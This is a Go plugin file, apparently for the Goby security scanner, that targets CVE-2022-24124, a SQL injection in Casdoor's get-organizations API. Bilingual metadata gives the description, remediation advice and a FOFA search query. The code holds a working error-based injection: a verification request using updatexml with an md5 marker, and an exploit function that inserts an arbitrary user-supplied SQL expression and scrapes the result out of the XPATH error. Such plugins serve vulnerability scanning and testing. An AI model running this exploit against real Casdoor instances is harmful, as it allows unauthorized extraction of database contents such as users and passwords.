package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Casdoor v1.13 get-organizations Api field Params sqli vulnerability (CVE-2022-24124)",
    "Description": "<p>Casdoor is an open source identity and access management (IAM) / single sign-on (SSO) platform with a web UI that supports OAuth 2.0 / OIDC and SAML authentication.</p><p>Before Casdoor 1.13.1, there is a SQL injection vulnerability in api/get-organizations, and attackers can use the vulnerability to obtain sensitive information such as database users and passwords.</p>",
    "Impact": "<p>Before Casdoor 1.13.1, there is a SQL injection vulnerability in api/get-organizations, and attackers can use the vulnerability to obtain sensitive information such as database users and passwords.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/casdoor/casdoor/pull/442\">https://github.com/casdoor/casdoor/pull/442</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Casdoor",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "Casdoor 1.13 版本 get-organizations 接口 field 参数 SQL 注入漏洞（CVE-2022-24124）",
            "Product": "Casdoor",
            "Description": "<p>Casdoor是开源的一个身份和访问管理 (IAM) / 单点登录 (SSO) 平台，带有支持 OAuth 2.0 / OIDC 和 SAML 身份验证的 Web UI 。</p><p>Casdoor 1.13.1 之前api/get-organizations 存在SQL注入漏洞，攻击者可利用漏洞获取数据库用户、密码等敏感信息。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/casdoor/casdoor/pull/442\">https://github.com/casdoor/casdoor/pull/442</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>Casdoor 1.13.1 之前api/get-organizations 存在SQL注入漏洞，攻击者可利用漏洞获取数据库用户、密码等敏感信息。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Casdoor v1.13 get-organizations Api field Params sqli vulnerability (CVE-2022-24124)",
            "Product": "Casdoor",
            "Description": "<p>Casdoor is an open source identity and access management (IAM) / single sign-on (SSO) platform with a web UI that supports OAuth 2.0 / OIDC and SAML authentication.</p><p>Before Casdoor 1.13.1, there is a SQL injection vulnerability in api/get-organizations, and attackers can use the vulnerability to obtain sensitive information such as database users and passwords.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/casdoor/casdoor/pull/442\">https://github.com/casdoor/casdoor/pull/442</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Before Casdoor 1.13.1, there is a SQL injection vulnerability in api/get-organizations, and attackers can use the vulnerability to obtain sensitive information such as database users and passwords.</span><br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "banner=\"casdoor_session_id\" || header=\"casdoor_session_id\"",
    "GobyQuery": "banner=\"casdoor_session_id\" || header=\"casdoor_session_id\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://github.com/casdoor/casdoor",
    "DisclosureDate": "2022-02-21",
    "References": [
        "http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202201-2707"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.0",
    "CVEIDs": [
        "CVE-2022-24124"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202201-2707"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "user()",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10261"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(1,md5(333),1)"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				return resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "XPATH syntax error") && strings.Contains(resp1.RawBody, "dcbbf4cce62f762a2aaa148d556bd")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := fmt.Sprintf("/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(1,%s,1)", cmd)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "XPATH syntax error: &#39;") {
					body := regexp.MustCompile("XPATH syntax error: &#39;(.*?)&#39;").FindStringSubmatch(resp.RawBody)
					expResult.Output = body[1]
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
